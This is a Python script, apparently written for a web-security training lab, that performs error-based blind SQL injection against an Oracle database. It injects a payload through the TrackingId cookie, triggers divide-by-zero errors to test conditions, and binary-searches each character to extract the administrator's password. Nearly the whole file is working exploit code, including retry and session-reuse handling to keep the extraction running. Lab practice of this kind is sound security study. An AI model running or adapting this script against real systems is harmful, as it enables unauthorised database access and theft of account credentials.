#!/usr/bin/env python3
import sys
import requests
import urllib3
import urllib.parse
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# --- Fill these with the *current* values from Burp ---
TRACKING_ID_PREFIX = "py5Q3UvMjOYoDB4o"   # everything before the injection point
SESSION_COOKIE     = "QaZXBCycgtRfufGWwPrC7pLvf2YHh5Az"
PASSWORD_LENGTH    = 20

# Printable ASCII excluding single quote (would break the payload)
CHARSET = ''.join(chr(c) for c in range(33, 127) if chr(c) != "'")

# --- Reused session: keep-alive avoids a fresh TLS handshake per request,
# which is what caused the ReadTimeout/handshake timeout crash last run.
# Retry absorbs an occasional flaky request instead of killing the run. ---
http = requests.Session()
retries = Retry(total=3, backoff_factor=1, status_forcelist=[502, 503, 504])
http.mount("https://", HTTPAdapter(max_retries=retries, pool_maxsize=10))


def send_payload(url: str, condition: str) -> bool:
    """
    Returns True when the condition is TRUE (i.e. we get HTTP 500).
    """
    payload = (
        "' || (SELECT CASE WHEN (%s) THEN TO_CHAR(1/0) ELSE '' END "
        "FROM users WHERE username='administrator') || '" % condition
    )
    encoded = urllib.parse.quote(payload)
    cookies = {
        "TrackingId": TRACKING_ID_PREFIX + encoded,
        "session": SESSION_COOKIE,
    }
    try:
        r = http.get(url, cookies=cookies, verify=False, timeout=20)
    except requests.exceptions.RequestException as e:
        print(f"\n[!] Request failed after retries ({e}), treating as False and continuing")
        return False
    return r.status_code == 500


def baseline_check(url: str) -> bool:
    true_case  = send_payload(url, "1=1")
    false_case = send_payload(url, "1=2")
    print(f"[+] Baseline → 1=1 produced 500: {true_case}, 1=2 produced 500: {false_case}")
    return true_case and not false_case


def find_char_at_position(url: str, pos: int) -> str:
    lo, hi = 0, len(CHARSET) - 1
    while lo <= hi:
        mid = (lo + hi) // 2
        candidate = CHARSET[mid]
        if send_payload(url, f"SUBSTR(password,{pos},1) > '{candidate}'"):
            lo = mid + 1
        else:
            hi = mid - 1
    if lo >= len(CHARSET):
        return "?"
    result = CHARSET[lo]
    if send_payload(url, f"SUBSTR(password,{pos},1) = '{result}'"):
        return result
    return "?"


def extract_password(url: str) -> str:
    if not baseline_check(url):
        print("[-] Baseline failed. Update TRACKING_ID_PREFIX / SESSION_COOKIE / URL and try again.")
        sys.exit(1)
    password = ""
    for i in range(1, PASSWORD_LENGTH + 1):
        char = find_char_at_position(url, i)
        password += char
        sys.stdout.write(f"\r[+] Password so far: {password}")
        sys.stdout.flush()
    print()
    return password


def main():
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <lab-url>")
        sys.exit(1)
    url = sys.argv[1].rstrip("/")
    print("[+] Starting error-based blind SQLi (Oracle) ...")
    pw = extract_password(url)
    print(f"[+] Administrator password: {pw}")


if __name__ == "__main__":
    main()
